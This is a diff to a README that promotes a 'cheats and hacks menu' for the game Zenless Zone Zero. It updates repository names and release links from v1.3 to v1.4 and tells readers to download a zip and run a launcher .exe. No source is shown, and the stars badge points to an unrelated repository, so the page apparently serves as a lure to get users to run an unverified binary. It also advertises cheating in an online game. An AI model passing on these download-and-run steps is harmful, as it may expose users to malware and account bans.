@@ -1,18 +1,18 @@
-# Zenless Zone Zero Cheat & Mod Menu (UPD: 16-Aug-2026)
+# Zenless Zone Zero Cheats & Hacks Menu (UPD: 19-Aug-2026)
 
-[![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/rivetqueenrivet/ZZZ-trainer/releases/download/v1.3/ZZZ.Mod.Menu-v1.3.zip)
-[![GitHub release](https://img.shields.io/badge/Release-v1.3-blue?style=for-the-badge)](https://github.com/rivetqueenrivet/ZZZ-trainer/releases/download/v1.3/ZZZ.Mod.Menu-v1.3.zip)
+[![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/rivetqueenrivet/Zenless-Cheat-ZZZ/releases/download/v1.4/ZZZ.Mod.Menu-v1.4.zip)
+[![GitHub release](https://img.shields.io/badge/Release-v1.4-blue?style=for-the-badge)](https://github.com/rivetqueenrivet/Zenless-Cheat-ZZZ/releases/download/v1.4/ZZZ.Mod.Menu-v1.4.zip)
 [![License: MIT](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)](https://opensource.org/licenses/MIT)
-[![Stars](https://img.shields.io/github/stars/rivetqueenrivet/ZZZ-trainer?style=for-the-badge&logo=github)](https://github.com/rivetqueenrivet/ZZZ-trainer/stargazers)
+[![Stars](https://img.shields.io/github/stars/sglkc/endfield-auto-daily?style=for-the-badge&logo=github)](https://github.com/rivetqueenrivet/Zenless-Cheat-ZZZ/stargazers)
 
 
-A powerful trainer tool for Zenless Zone Zero with clean in-game overlay
+_A powerful hacks tool for Zenless Zone Zero with clean in-game overlay_
 
 ---
 
 ## Features
 
-![ZZZ Cheat Preview Hack](https://github.com/rivetqueenrivet/zzz-trainer/blob/main/assets/GUI/image.png)
+![ZZZ Cheat Preview Hack](https://github.com/rivetqueenrivet/Zenless-Cheat-ZZZ/blob/main/assets/GUI/image.png)
 
 
 | Player | World | Visuals | Misc |
@@ -26,10 +26,10 @@ A powerful trainer tool for Zenless Zone Zero with clean in-game overlay
 ---
 
 ## How to Install
-1. Download the [latest release build](https://github.com/rivetqueenrivet/zzz-trainer/releases/download/v1.3/ZZZ.Mod.Menu-v1.3.zip) from repo's Releases page.
-2. Extract the contents to any folder (e.g., `C:\ZZZ_Trainer` or Desktop).
+1. Download the [latest release build](https://github.com/rivetqueenrivet/Zenless-Cheat-ZZZ/releases/download/v1.4/ZZZ.Mod.Menu-v1.4.zip) from repo's Releases page.
+2. Extract the contents to any folder (e.g., `C:\zzz-hacks` or Desktop).
 3. Launch game.
-4. Run `ZZZ-Launcher_github-1.3.exe`.
+4. Run `ZZZ-Launcher_github-1.4.exe`.
 5. Enjoy. Press the toggle hotkey (default: `[Insert]`) to open the menu.
 
 ---
@@ -63,6 +63,5 @@ Simply delete the extracted folder. There are no registry changes or leftover fi
 
 ---
 
-[Download Latest Version](https://github.com/rivetqueenrivet/zzz-trainer/releases/download/v1.3/ZZZ.Mod.Menu-v1.3.zip)
 
-[![Made with C++](https://img.shields.io/badge/Made%20with-C++-f34b7d?style=for-the-badge&logo=c%2B%2B)](https://github.com/rivetqueenrivet/zzz-trainer)
+[![Made with C++](https://img.shields.io/badge/Made%20with-C++-f34b7d?style=for-the-badge&logo=c%2B%2B)](https://github.com/rivetqueenrivet/Zenless-Cheat-ZZZ)
